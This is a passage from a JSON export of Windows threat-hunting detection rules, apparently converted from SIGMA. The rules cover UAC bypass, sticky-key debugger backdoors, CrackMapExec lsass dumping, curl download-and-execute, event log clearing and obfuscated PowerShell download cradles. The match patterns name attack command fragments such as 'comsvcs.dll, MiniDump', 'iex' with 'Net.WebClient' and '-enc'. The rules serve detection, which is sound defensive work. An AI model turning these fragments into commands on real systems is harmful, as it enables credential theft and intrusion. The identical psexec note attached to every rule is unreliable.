            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\Microsoft.NodejsTools.PressAnyKey.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 870
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using DismHost",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"C:\\Users\\\" and src.process.image.path contains \"\\AppData\\Local\\Temp\\\" and src.process.image.path contains \"\\DismHost.exe\") and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 871
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "Suspicious Debugger Registration Cmdline",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\CurrentVersion\\Image File Execution Options\\\" and (tgt.process.cmdline contains \"sethc.exe\" or tgt.process.cmdline contains \"utilman.exe\" or tgt.process.cmdline contains \"osk.exe\" or tgt.process.cmdline contains \"magnify.exe\" or tgt.process.cmdline contains \"narrator.exe\" or tgt.process.cmdline contains \"displayswitch.exe\" or tgt.process.cmdline contains \"atbroker.exe\" or tgt.process.cmdline contains \"HelpPane.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 872
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects port forwarding activity via SSH.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572",
                "t1021",
                "t1021"
            ],
            "name": "Port Forwarding Activity Via SSH.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ssh.exe\" and (tgt.process.cmdline contains \" -R \" or tgt.process.cmdline contains \" /R \" or tgt.process.cmdline contains \" \u2013R \" or tgt.process.cmdline contains \" \u2014R \" or tgt.process.cmdline contains \" \u2015R \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 873
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1190",
                "t1210"
            ],
            "name": "Terminal Service Process Spawn",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.cmdline contains \"\\svchost.exe\" and src.process.cmdline contains \"termsvcs\") and (not ((tgt.process.image.path contains \"\\rdpclip.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\csrss.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\wininit.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\winlogon.exe\") or not (tgt.process.image.path matches \"\\.*\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 874
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious execution of \"PDQDeployRunner\" which is part of the PDQDeploy service stack that is responsible for executing commands and packages on a remote machines",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potentially Suspicious Execution Of PDQDeployRunner",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\PDQDeployRunner-\" and ((tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\csc.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\dllhost.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\wsl.exe\") or (tgt.process.image.path contains \":\\ProgramData\\\" or tgt.process.image.path contains \":\\Users\\Public\\\" or tgt.process.image.path contains \":\\Windows\\TEMP\\\" or tgt.process.image.path contains \"\\AppData\\Local\\Temp\") or (tgt.process.cmdline contains \" -decode \" or tgt.process.cmdline contains \" -enc \" or tgt.process.cmdline contains \" -encodedcommand \" or tgt.process.cmdline contains \" -w hidden\" or tgt.process.cmdline contains \"DownloadString\" or tgt.process.cmdline contains \"FromBase64String\" or tgt.process.cmdline contains \"http\" or tgt.process.cmdline contains \"iex \" or tgt.process.cmdline contains \"Invoke-\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 875
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process patterns found in logs when CrackMapExec is used",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "HackTool - CrackMapExec Process Patterns",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"tasklist /fi \" and tgt.process.cmdline contains \"Imagename eq lsass.exe\") and (tgt.process.cmdline contains \"cmd.exe /c \" or tgt.process.cmdline contains \"cmd.exe /r \" or tgt.process.cmdline contains \"cmd.exe /k \" or tgt.process.cmdline contains \"cmd /c \" or tgt.process.cmdline contains \"cmd /r \" or tgt.process.cmdline contains \"cmd /k \") and (tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\")) or (tgt.process.cmdline contains \"do rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump\" and tgt.process.cmdline contains \"\\Windows\\Temp\\\" and tgt.process.cmdline contains \" full\" and tgt.process.cmdline contains \"%%B\") or (tgt.process.cmdline contains \"tasklist /v /fo csv\" and tgt.process.cmdline contains \"findstr /i \\\"lsass\\\"\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 876
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1202"
            ],
            "name": "Suspicious High IntegrityLevel Conhost Legacy Option",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.integrityLevel in (\"High\",\"S-1-16-12288\")) and (tgt.process.cmdline contains \"conhost.exe\" and tgt.process.cmdline contains \"0xffffffff\" and tgt.process.cmdline contains \"-ForceV1\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 877
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1105"
            ],
            "name": "Curl Download And Execute Combination",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -c \" or tgt.process.cmdline contains \" /c \" or tgt.process.cmdline contains \" \u2013c \" or tgt.process.cmdline contains \" \u2014c \" or tgt.process.cmdline contains \" \u2015c \") and (tgt.process.cmdline contains \"curl \" and tgt.process.cmdline contains \"http\" and tgt.process.cmdline contains \"-o\" and tgt.process.cmdline contains \"&\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 878
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the clearing or configuration tampering of EventLog using utilities such as \"wevtutil\", \"powershell\" and \"wmic\".\nThis technique were seen used by threat actors and ransomware strains in order to evade defenses.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1070",
                "t1562"
            ],
            "name": "Suspicious Eventlog Clearing or Configuration Change Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\wevtutil.exe\" and (tgt.process.cmdline contains \"clear-log \" or tgt.process.cmdline contains \" cl \" or tgt.process.cmdline contains \"set-log \" or tgt.process.cmdline contains \" sl \" or tgt.process.cmdline contains \"lfn:\")) or ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \"Clear-EventLog \" or tgt.process.cmdline contains \"Remove-EventLog \" or tgt.process.cmdline contains \"Limit-EventLog \" or tgt.process.cmdline contains \"Clear-WinEvent \")) or ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wmic.exe\") and tgt.process.cmdline contains \"ClearEventLog\")) and (not ((src.process.image.path in (\"C:\\Windows\\SysWOW64\\msiexec.exe\",\"C:\\Windows\\System32\\msiexec.exe\")) and tgt.process.cmdline contains \" sl \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 879
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects WMIC executing \"process call create\" with suspicious calls to processes such as \"rundll32\", \"regsrv32\", etc.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047"
            ],
            "name": "Suspicious Process Created Via Wmic.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"process \" and tgt.process.cmdline contains \"call \" and tgt.process.cmdline contains \"create \") and (tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"bitsadmin\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"cmd.exe /c \" or tgt.process.cmdline contains \"cmd.exe /k \" or tgt.process.cmdline contains \"cmd.exe /r \" or tgt.process.cmdline contains \"cmd /c \" or tgt.process.cmdline contains \"cmd /k \" or tgt.process.cmdline contains \"cmd /r \" or tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"pwsh\" or tgt.process.cmdline contains \"certutil\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"\\Users\\Public\\\" or tgt.process.cmdline contains \"\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\\" or tgt.process.cmdline contains \"%temp%\" or tgt.process.cmdline contains \"%tmp%\" or tgt.process.cmdline contains \"%ProgramData%\" or tgt.process.cmdline contains \"%appdata%\" or tgt.process.cmdline contains \"%comspec%\" or tgt.process.cmdline contains \"%localappdata%\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 880
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of different Windows based hacktools via PE metadata (company, product, etc.) even if the files have been renamed",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1588",
                "t1003"
            ],
            "name": "Hacktool Execution - PE Metadata",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.publisher=\"Cube0x0\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 881
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious PowerShell invocation command parameters",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"-nop\" and tgt.process.cmdline contains \" -w \" and tgt.process.cmdline contains \"hidden\" and tgt.process.cmdline contains \" -c \" and tgt.process.cmdline contains \"[Convert]::FromBase64String\") or (tgt.process.cmdline contains \" -w \" and tgt.process.cmdline contains \"hidden\" and tgt.process.cmdline contains \"-noni\" and tgt.process.cmdline contains \"-nop\" and tgt.process.cmdline contains \" -c \" and tgt.process.cmdline contains \"iex\" and tgt.process.cmdline contains \"New-Object\") or (tgt.process.cmdline contains \" -w \" and tgt.process.cmdline contains \"hidden\" and tgt.process.cmdline contains \"-ep\" and tgt.process.cmdline contains \"bypass\" and tgt.process.cmdline contains \"-Enc\") or (tgt.process.cmdline contains \"powershell\" and tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \"add\" and tgt.process.cmdline contains \"\\software\\\") or (tgt.process.cmdline contains \"bypass\" and tgt.process.cmdline contains \"-noprofile\" and tgt.process.cmdline contains \"-windowstyle\" and tgt.process.cmdline contains \"hidden\" and tgt.process.cmdline contains \"new-object\" and tgt.process.cmdline contains \"system.net.webclient\" and tgt.process.cmdline contains \".download\") or (tgt.process.cmdline contains \"iex\" and tgt.process.cmdline contains \"New-Object\" and tgt.process.cmdline contains \"Net.WebClient\" and tgt.process.cmdline contains \".Download\")) and (not (tgt.process.cmdline contains \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\" or tgt.process.cmdline contains \"Write-ChocolateyWarning\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 882
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI.\nAn example would be a threat actor creating a new user via the net command and providing the password inline\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Weak or Abused Passwords In CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"123456789\" or tgt.process.cmdline contains \"123123qwE\" or tgt.process.cmdline contains \"Asd123.aaaa\" or tgt.process.cmdline contains \"Decryptme\" or tgt.process.cmdline contains \"P@ssw0rd!\" or tgt.process.cmdline contains \"Pass8080\" or tgt.process.cmdline contains \"password123\" or tgt.process.cmdline contains \"test@202\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 883
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1202"
            ],
            "name": "Rundll32 Execution Without CommandLine Parameters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\rundll32.exe\" or tgt.process.cmdline contains \"\\rundll32.exe\\\"\" or tgt.process.cmdline contains \"\\rundll32\") and (not (src.process.image.path contains \"\\AppData\\Local\\\" or src.process.image.path contains \"\\Microsoft\\Edge\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 884
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the 'Pubprn.vbs' Microsoft signed script to execute commands.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Pubprn.vbs Proxy Execution",
